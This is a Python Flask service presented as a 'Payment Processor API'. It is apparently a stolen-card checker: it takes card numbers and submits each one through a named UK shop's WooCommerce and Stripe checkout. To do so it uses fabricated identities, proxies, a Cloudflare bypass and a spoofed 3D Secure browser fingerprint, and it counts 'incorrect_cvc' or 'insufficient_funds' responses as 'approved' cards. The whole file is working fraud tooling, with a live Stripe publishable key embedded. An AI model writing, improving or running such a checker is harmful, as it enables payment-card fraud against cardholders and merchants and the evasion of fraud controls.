import os
from flask import Flask, request, jsonify
import cloudscraper
from fake_useragent import UserAgent
from datetime import datetime
from faker import Faker
from urllib.parse import quote_plus
import json
import time
import random
import re

app = Flask(__name__)

DELAY_BETWEEN_REQUESTS = 2
DELAY_RANDOM_RANGE = 1

def random_delay():
    delay = DELAY_BETWEEN_REQUESTS + random.uniform(0, DELAY_RANDOM_RANGE)
    time.sleep(delay)

def format_proxy(proxy_string):
    """Convert proxy string to proper format"""
    if not proxy_string:
        return None
    
    if proxy_string.startswith(('http://', 'https://')):
        return proxy_string
    
    parts = proxy_string.split(':')
    
    if len(parts) == 4:
        host, port, username, password = parts
        return f"http://{username}:{password}@{host}:{port}"
    elif len(parts) == 2:
        host, port = parts
        return f"http://{host}:{port}"
    else:
        return f"http://{proxy_string}"

def process_payment(card_data, proxy=None):
    try:
        scraper = cloudscraper.create_scraper(
            browser={
                'browser': 'chrome',
                'platform': 'windows',
                'mobile': False
            }
        )

        formatted_proxy = format_proxy(proxy)
        
        if formatted_proxy:
            proxies = {
                "http": formatted_proxy,
                "https": formatted_proxy,
            }
            scraper.proxies = proxies

        fake = Faker('en_GB')
        first_name = fake.first_name()
        last_name = fake.last_name()
        address_1 = fake.street_address()
        city = fake.city()
        state = fake.random_element(elements=(
            'London', 'Manchester', 'Yorkshire', 'Essex', 
            'Kent', 'Lancashire', 'West Midlands', 'Glasgow',
            'Edinburgh', 'Birmingham', 'Liverpool', 'Bristol',
            'Sheffield', 'Leeds', 'Cardiff', 'Belfast',
            'Nottingham', 'Leicester', 'Coventry', 'Hull',
            'Newcastle', 'Brighton', 'Portsmouth', 'Southampton',
            'Norfolk', 'Suffolk', 'Devon', 'Cornwall',
            'Dorset', 'Somerset', 'Cheshire', 'Shropshire',
            'Derbyshire', 'Nottinghamshire', 'Lincolnshire',
            'Northumberland', 'Durham', 'Cumbria', 'North Yorkshire',
            'West Yorkshire', 'South Yorkshire', 'Merseyside',
            'Greater Manchester', 'West Midlands', 'Warwickshire',
            'Staffordshire', 'Hertfordshire', 'Buckinghamshire',
            'Oxfordshire', 'Gloucestershire', 'Cambridgeshire',
            'Worcestershire', 'Herefordshire', 'Bedfordshire',
            'Berkshire', 'Surrey', 'Sussex', 'Hampshire',
            'Isle of Wight', 'Wiltshire', 'Northamptonshire',
            'Rutland', 'Monmouthshire', 'Glamorgan', 'Gwent',
            'Dyfed', 'Powys', 'Gwynedd', 'Clwyd',
            'Strathclyde', 'Lothian', 'Grampian', 'Tayside',
            'Fife', 'Central', 'Borders', 'Dumfries and Galloway',
            'Highland', 'Islands', 'Antrim', 'Down',
            'Armagh', 'Londonderry', 'Tyrone', 'Fermanagh'
        ))
        postcode = fake.postcode()
        email = fake.email(domain='gmail.com')
        phone = fake.phone_number()
        name = f"{first_name}+{last_name}"
        email_encoded = quote_plus(email)
        ua = UserAgent()
        user_agent = ua.random

        billing_country = 'GB'
        billing_address_1 = quote_plus(address_1)
        billing_address_2 = ''
        billing_city = quote_plus(city)
        billing_state = quote_plus(state)
        billing_postcode = quote_plus(postcode)
        billing_phone = quote_plus(phone)

        card = card_data
        cc, mm, yy, ccv = card.split("|")
        if yy.startswith('20'):
            yy = yy[2:]

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'cache-control': 'max-age=0',
            'priority': 'u=0, i',
            'user-agent': user_agent,
        }

        response = scraper.get(
            'https://www.balliante.com/store/product/2-m-high-speed-hdmi-cable-hdmi-m-m/',
            headers=headers,
        )
        random_delay()

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'cache-control': 'max-age=0',
            'origin': 'null',
            'priority': 'u=0, i',
            'user-agent': user_agent,
        }

        params = {
            'quantity': '1',
            'add-to-cart': '5360',
        }

        response = scraper.post(
            'https://www.balliante.com/store/product/2-m-high-speed-hdmi-cable-hdmi-m-m/',
            headers=headers,
            params=params,
        )
        random_delay()

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'priority': 'u=0, i',
            'user-agent': user_agent,
        }

        response = scraper.get('https://www.balliante.com/store/checkout/', headers=headers)
        random_delay()

        html = response.text
        noncewo = html.split('name="woocommerce-process-checkout-nonce"')[1].split('value="')[1].split('"')[0]
        noncelogin = html.split('name="woocommerce-login-nonce"')[1].split('value="')[1].split('"')[0]

        headers = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'user-agent': user_agent,
        }

        data = (
            f'billing_details[name]={name}&'
            f'billing_details[email]={email_encoded}&'
            f'billing_details[phone]={billing_phone}&'
            f'billing_details[address][city]={billing_city}&'
            f'billing_details[address][country]=GB&'
            f'billing_details[address][line1]={billing_address_1}&'
            f'billing_details[address][line2]=&'
            f'billing_details[address][postal_code]={billing_postcode}&'
            f'billing_details[address][state]={billing_state}&'
            f'type=card&'
            f'card[number]={cc}&'
            f'card[cvc]={ccv}&'
            f'card[exp_year]={yy}&'
            f'card[exp_month]={mm}&'
            f'allow_redisplay=unspecified&'
            f'payment_user_agent=stripe.js%2F4209db5aac%3B+stripe-js-v3%2F4209db5aac%3B+payment-element%3B+deferred-intent&'
            f'referrer=https%3A%2F%2Fwww.balliante.com&'
            f'key=pk_live_51Fftn2B5suwcKLEosnFZXZigPCvwIRldF9bqwCyzcOzNqfYfdGLfO88GdBYH46sGide0qSHP7WMbm6rrV2KQKlst00Nff2HGzm&'
        )

        response = scraper.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        random_delay()
        stripe_account = response.headers.get('Stripe-Account')
        json_data = response.json()
        idstripe = json_data['id']

        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.balliante.com',
            'priority': 'u=1, i',
            'user-agent': user_agent,
        }

        params = {
            'wc-ajax': 'checkout',
        }

        data = (
            f'username=&'
            f'password=&'
            f'woocommerce-login-nonce={noncelogin}&'
            f'_wp_http_referer=https%3A%2F%2Fwww.balliante.com%2Fstore%2Fcheckout%2F%3FelementorPageId%3D118%26elementorWidgetId%3D2722c17&'
            f'redirect=https%3A%2F%2Fwww.balliante.com%2Fstore%2Fcheckout%2F&'
            
            f'wc_order_attribution_session_entry=https%3A%2F%2Fwww.balliante.com%2Fstore%2Fproducts%2F&'
        
            f'billing_email={email_encoded}&'
            f'billing_first_name={first_name}&'
            f'billing_last_name={last_name}&'
            f'billing_country=GB&'
            f'billing_address_1={billing_address_1}&'
            f'billing_address_2=&'
            f'billing_city={billing_city}&'
            f'billing_state={billing_state}&'
            f'billing_postcode={billing_postcode}&'
            f'billing_phone={billing_phone}&'
            f'shipping_first_name=&'
            f'shipping_last_name=&'
            f'shipping_country=GB&'
            f'shipping_address_1=&'
            f'shipping_address_2=&'
            f'shipping_city=&'
            f'shipping_state=&'
            f'shipping_postcode=&'
            f'shipping_phone=&'
            f'order_comments=&'
            f'shipping_method%5B0%5D=flat_rate%3A1&'
            f'coupon_code=&'
            f'payment_method=stripe&'
            f'wc-stripe-payment-method-upe=&'
            f'wc_stripe_selected_upe_payment_type=&'
            f'wc-stripe-is-deferred-intent=1&'
            f'woocommerce-process-checkout-nonce={noncewo}&'
        
            f'wc-stripe-payment-method={idstripe}'
        )

        response = scraper.post('https://www.balliante.com/store/', params=params, headers=headers, data=data)
        random_delay()

        response_data = response.json()
        redirect = response_data.get('redirect', '')

        if redirect and len(redirect.split(':')) >= 3:
            full_secret = redirect.split(':')[2]
            
            if '_secret_' in full_secret:
                pi_only = full_secret.split('_secret_')[0]
            else:
                return {"status": "declined", "message": "Your card number is incorrect."}
        else:
            return {"status": "declined", "message": "Your card number is incorrect."}

        headers = {
            'accept': 'application/json',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'user-agent': user_agent,
        }

        data = f'use_stripe_sdk=true&mandate_data[customer_acceptance][type]=online&mandate_data[customer_acceptance][online][infer_from_client]=true&key=pk_live_51Fftn2B5suwcKLEosnFZXZigPCvwIRldF9bqwCyzcOzNqfYfdGLfO88GdBYH46sGide0qSHP7WMbm6rrV2KQKlst00Nff2HGzm&_stripe_version=2024-06-20&client_secret={full_secret}'

        response = scraper.post(
            f'https://api.stripe.com/v1/payment_intents/{pi_only}/confirm',
            headers=headers,
            data=data,
        )
        response_data = response.json()
        three_d_secure_2_source = response_data.get('next_action', {}).get('use_stripe_sdk', {}).get('three_d_secure_2_source')

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://geoissuer.cardinalcommerce.com',
            'pragma': 'no-cache',
            'priority': 'u=0, i',
            'referer': 'https://geoissuer.cardinalcommerce.com/',
            'user-agent': user_agent,
        }

        data = {
            'threeDSMethodData': 'eyJ0aHJlZURTU2VydmVyVHJhbnNJRCI6ImMxMmU5NmRhLWY0OWUtNDc1Yi05NzMyLTZkYWNjOTJkZTdhMCJ9',
        }

        response = scraper.post(
            f'https://hooks.stripe.com/3d_secure_2/fingerprint/{stripe_account}/{three_d_secure_2_source}',
            headers=headers,
            data=data,
        )

        headers = {
            'accept': 'application/json',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'user-agent': user_agent,
        }

        browser_data = {
            "fingerprintAttempted": True,
            "challengeWindowSize": None,
            "threeDSCompInd": "Y",
            "browserJavaEnabled": False,
            "browserJavascriptEnabled": True,
            "browserLanguage": "en-GB",  
            "browserColorDepth": "24",
            "browserScreenHeight": "1080",  
            "browserScreenWidth": "1920",   
            "browserTZ": "0",               
            "browserUserAgent": user_agent   
        }

        browser_json = json.dumps(browser_data)
        browser_encoded = quote_plus(browser_json)

        data = (
            f'source={three_d_secure_2_source}&'
            f'browser={browser_encoded}&'
            f'one_click_authn_device_support[hosted]=false&'
            f'one_click_authn_device_support[same_origin_frame]=false&'
            f'one_click_authn_device_support[spc_eligible]=false&'
            f'one_click_authn_device_support[webauthn_eligible]=false&'
            f'one_click_authn_device_support[publickey_credentials_get_allowed]=true&'
            f'key=pk_live_51Fftn2B5suwcKLEosnFZXZigPCvwIRldF9bqwCyzcOzNqfYfdGLfO88GdBYH46sGide0qSHP7WMbm6rrV2KQKlst00Nff2HGzm&'
            f'_stripe_version=2024-06-20'
        )

        response = scraper.post('https://api.stripe.com/v1/3ds2/authenticate', headers=headers, data=data)

        headers = {
            'accept': 'application/json',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'user-agent': user_agent,
        }

        params = {
            'is_stripe_sdk': 'false',
            'client_secret': full_secret,
            'key': 'pk_live_51Fftn2B5suwcKLEosnFZXZigPCvwIRldF9bqwCyzcOzNqfYfdGLfO88GdBYH46sGide0qSHP7WMbm6rrV2KQKlst00Nff2HGzm',
            '_stripe_version': '2024-06-20',
        }

        response = scraper.get(f'https://api.stripe.com/v1/payment_intents/{pi_only}', params=params, headers=headers)
        response_text = response.text
        data = json.loads(response_text)

        result = {}
        if data.get('last_payment_error') is not None:
            error = data['last_payment_error']
            message = error['message']
            code = error['code']
            
            approved_codes = ['incorrect_cvc', 'insufficient_funds']
            
            if code in approved_codes:
                result = {"status": "approved", "message": message, "code": code}
            else:
                result = {"status": "declined", "message": message, "code": code}
            
        elif data.get('status') == 'requires_action':
            result = {"status": "declined", "message": "3D Secure Verification Required", "code": "requires_action"}
            
        elif data.get('status') == 'succeeded':
            result = {"status": "approved", "message": "Payment successful", "code": "succeeded"}
            
        else:
            status = data.get('status', 'unknown')
            result = {"status": "unknown", "message": f"Status: {status}", "code": status}

        return result

    except Exception as e:
        return {"status": "error", "message": str(e)}

@app.route('/')
def home():
    return jsonify({"message": "Payment Processor API", "status": "running"})

@app.route('/process', methods=['POST'])
def process():
    try:
        data = request.get_json()
        
        if not data or 'card' not in data:
            return jsonify({"status": "error", "message": "Card data is required"}), 400
        
        card_data = data['card']
        proxy = data.get('proxy')
        
        if not re.match(r'^\d+\|\d+\|\d+\|\d+$', card_data):
            return jsonify({"status": "error", "message": "Invalid card format. Use: cc|mm|yy|cvv"}), 400
        
        result = process_payment(card_data, proxy)
        
        return jsonify(result)
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/index.php')
def process_get():
    try:
        site = request.args.get('site', 'default')
        cc = request.args.get('cc')
        proxy = request.args.get('proxy')
        
        if not cc:
            return jsonify({"status": "error", "message": "Card data is required"}), 400
        
        if not re.match(r'^\d+\|\d+\|\d+\|\d+$', cc):
            return jsonify({"status": "error", "message": "Invalid card format. Use: cc|mm|yy|cvv"}), 400
        
        result = process_payment(cc, proxy)
        
        return jsonify({
            "site": site,
            "card": cc,
            "proxy": proxy,
            "result": result
        })
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port, debug=False)
